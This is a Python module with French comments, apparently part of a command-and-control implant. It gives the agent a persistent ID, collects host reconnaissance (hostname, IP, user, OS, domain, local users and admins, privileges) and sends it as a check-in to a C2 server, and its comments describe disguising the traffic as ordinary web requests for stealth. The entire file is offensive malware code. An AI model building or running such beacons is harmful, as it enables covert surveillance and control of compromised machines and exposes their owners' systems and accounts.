# comms/http_beacon.py
# Module de communication pour l'agent utilisant le protocole HTTP/HTTPS.
# Simule le trafic web légitime pour la furtivité.
# Gère le 'jitter' et le 'sleep' pour varier les intervalles de communication.

"""
HTTP Beacon communication for the agent.
"""
import requests
import time
import uuid
import socket # Pour récupérer le hostname
import platform # Pour récupérer des infos OS

# from agent.core import system_info # ANCIEN
from ..core import system_info # MODIFIÉ: Import relatif pour system_info

# Ce fichier ne devrait plus définir de SERVER_URL global ici.
# Il sera passé par agent_main.py

AGENT_ID_FILE = "agent_id.txt" # Peut être stocké dans un endroit plus discret

def get_agent_id():
    """Récupère ou génère un ID unique pour l'agent."""
    try:
        with open(AGENT_ID_FILE, "r") as f:
            agent_id = f.read().strip()
            if agent_id:
                return agent_id
    except FileNotFoundError:
        pass # Le fichier n'existe pas, générer un nouvel ID
    
    agent_id = str(uuid.uuid4())
    try:
        with open(AGENT_ID_FILE, "w") as f:
            f.write(agent_id)
    except IOError:
        # Si on ne peut pas écrire, on utilisera l'ID en mémoire pour cette session
        print(f"Avertissement: Impossible d'écrire le fichier agent_id ({AGENT_ID_FILE}). L'ID sera temporaire.")
        pass 
    return agent_id

def get_base_agent_info(agent_version: str):
    """Récupère les informations de base et détaillées sur l'hôte."""
    basic_info = {
        # "agent_id": get_agent_id(), # L'ID est géré par agent_main
        "agent_version": agent_version,
        # Les autres infos (hostname, ip, user, os) viendront de system_info
    }
    
    detailed_sys_info = system_info.get_all_system_info()
    
    # Fusionner les dictionnaires, detailed_sys_info peut écraser des clés de basic_info si conflit
    # (ex: hostname, os), ce qui est souhaité car get_all_system_info est plus complet.
    agent_data = {**basic_info, **detailed_sys_info}
    
    # Assurer que les clés attendues par le serveur sont présentes, même si None
    # Le modèle Agent sur le serveur attend: hostname, internal_ip, username, os_target, domain_name, local_users, local_admins, current_user_privileges
    agent_data['os_target'] = agent_data.pop('os', None) # Renommer 'os' en 'os_target'
    agent_data.setdefault('internal_ip', None) # Pas explicitement dans get_all_system_info, mais était dans l'ancien get_host_info
    
    # Tentative de récupérer l'IP interne si elle n'est pas déjà là (peut être redondant si platform.node() est l'IP)
    if not agent_data.get('internal_ip'):
        try:
            # Ceci est une méthode simple, pourrait ne pas être la bonne IP externe/pertinente
            agent_data['internal_ip'] = socket.gethostbyname(agent_data.get("hostname", ""))
        except socket.gaierror:
            agent_data['internal_ip'] = "127.0.0.1" # Fallback

    return agent_data

def send_checkin(server_url: str, agent_id: str, agent_info: dict):
    """Envoie une requête de check-in au serveur C2."""
    checkin_url = f"{server_url.rstrip('/')}/agent/checkin"
    payload = {
        "agent_id": agent_id,
        "timestamp": time.time(), # Le serveur génère first_seen et last_checkin
        **agent_info # Intégrer les autres infos de l'agent
    }
    try:
        response = requests.post(checkin_url, json=payload, timeout=10)
        response.raise_for_status() 
        print(f"Agent {agent_id} check-in réussi sur {server_url}. Réponse: {response.json()}")
        return response.json()
    except requests.exceptions.Timeout:
        print(f"Timeout lors du check-in de l'agent {agent_id} à {checkin_url}.")
    except requests.exceptions.ConnectionError:
        print(f"Erreur de connexion lors du check-in de l'agent {agent_id} à {checkin_url}. Serveur C2 inaccessible ?")
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors du check-in de l'agent {agent_id}: {e}")
    return None

# Le bloc if __name__ == "__main__" est moins pertinent ici car le beacon sera appelé par agent_main.py
# On peut le garder pour un test unitaire rapide si besoin.
if __name__ == "__main__":
    print("Test direct de http_beacon.py...")
    test_server_url = "http://localhost:8000" # Pour test uniquement
    my_agent_id = get_agent_id()
    print(f"ID Agent: {my_agent_id}")
    base_agent_info = get_base_agent_info("0.1.0-test") # NOUVEAU, passer une version test
    print(f"Informations de l'agent: {base_agent_info}")
    
    print(f"Envoi d'un check-in test à {test_server_url}...")
    send_checkin(test_server_url, my_agent_id, base_agent_info) # NOUVEAU
